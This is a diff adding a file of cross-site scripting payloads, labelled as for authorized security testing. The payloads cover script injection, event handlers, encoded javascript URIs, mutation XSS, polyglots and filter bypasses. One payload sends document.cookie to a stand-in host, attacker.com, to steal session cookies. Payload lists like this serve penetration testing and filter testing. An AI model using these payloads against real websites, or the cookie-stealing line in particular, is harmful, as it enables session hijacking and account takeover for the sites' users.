@@ -1,0 +1,45 @@
+# XSS Payload Repository
+# These payloads are for authorized security testing only
+
+## Basic Script Injection
+<script>alert(1)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+
+## Event Handlers
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<img src=x onerror=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video><source onerror="alert(1)">
+<audio src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)">
+
+## JavaScript Protocol
+javascript:alert(1)
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
+&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29
+
+## Mutation XSS (mXSS)
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+
+## Polyglot Payloads
+jaVasCript:/*-/*`/*\`/*"></img></noscript></title></textarea></style></template>--><img src=x onerror=alert(1)>">
+-->'><img src=x onerror=alert(1)//
+
+## HTML Injection
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+
+## SVG Filter Bypass
+<svg><filter><feGaussianBlur><script>alert(1)</script></filter>
+
+## Encoded Payloads
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
